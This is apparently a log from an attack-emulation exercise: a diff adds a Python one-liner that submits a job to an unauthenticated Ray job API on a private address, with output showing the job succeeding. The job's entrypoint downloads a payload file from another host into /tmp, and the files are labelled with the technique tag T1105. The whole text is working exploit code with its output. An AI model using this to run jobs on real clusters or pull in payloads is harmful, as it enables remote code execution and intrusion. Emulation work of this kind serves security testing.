@@ -1,0 +1,37 @@
+$ python3 -c 'import json
+import requests
+import sys
+import time
+payload = json.loads('"'"'{"entrypoint": "python3 -c \'"'"'import urllib.request; urllib.request.urlretrieve(\\"http://172.19.0.3:18080/payload.txt\\", \\"/tmp/T1105_payload.txt\\")\'"'"' && sha256sum /tmp/T1105_payload.txt > /tmp/T1105.out"}'"'"')
+base = '"'"'http://172.19.0.2:8265'"'"'
+response = requests.post(base + '"'"'/api/jobs/'"'"', json=payload, timeout=30)
+sys.stdout.write(f'"'"'post_status={response.status_code} body={response.text[:1000]}\n'"'"')
+response.raise_for_status()
+body = response.json()
+submission_id = body.get('"'"'submission_id'"'"') or body.get('"'"'job_id'"'"')
+sys.stdout.write(f'"'"'submission_id={submission_id}\n'"'"')
+terminal = {'"'"'SUCCEEDED'"'"', '"'"'FAILED'"'"', '"'"'STOPPED'"'"'}
+if not submission_id:
+    sys.exit(1)
+for attempt in range(60):
+    status_response = requests.get(base + '"'"'/api/jobs/'"'"' + submission_id, timeout=10)
+    sys.stdout.write(f'"'"'poll={attempt} status={status_response.status_code} body={status_response.text[:1000]}\n'"'"')
+    if status_response.status_code == 404:
+        sys.stdout.write('"'"'poll_unavailable=surrogate_or_legacy_endpoint\n'"'"')
+        sys.exit(0)
+    status_response.raise_for_status()
+    status_body = status_response.json()
+    status = status_body.get('"'"'status'"'"')
+    if status in terminal:
+        sys.exit(0 if status == '"'"'SUCCEEDED'"'"' else 1)
+    time.sleep(1)
+sys.exit(1)'
+exit_code: 0
+--- stdout ---
+post_status=200 body={"job_id": "raysubmit_84LtaUkY6TAirnpm", "submission_id": "raysubmit_84LtaUkY6TAirnpm"}
+submission_id=raysubmit_84LtaUkY6TAirnpm
+poll=0 status=200 body={"type": "SUBMISSION", "job_id": null, "submission_id": "raysubmit_84LtaUkY6TAirnpm", "driver_info": null, "status": "PENDING", "entrypoint": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://172.19.0.3:18080/payload.txt\", \"/tmp/T1105_payload.txt\")' && sha256sum /tmp/T1105_payload.txt > /tmp/T1105.out", "message": "Job has not started yet.", "error_type": null, "start_time": 1791202312538, "end_time": null, "metadata": null, "runtime_env": null, "driver_agent_http_address": null, "driver_node_id": null}
+poll=1 status=200 body={"type": "SUBMISSION", "job_id": null, "submission_id": "raysubmit_84LtaUkY6TAirnpm", "driver_info": null, "status": "SUCCEEDED", "entrypoint": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://172.19.0.3:18080/payload.txt\", \"/tmp/T1105_payload.txt\")' && sha256sum /tmp/T1105_payload.txt > /tmp/T1105.out", "message": "Job finished successfully.", "error_type": null, "start_time": 1791202312538, "end_time": 1791202312973, "metadata": null, "runtime_env": null, "driver_agent_http_address": "http://172.19.0.2:52365", "driver_node_id": "2f65279e8e677945be12a985dfcbd14d33cd67afa61edb398018a4ed"}
+
+--- stderr ---
+
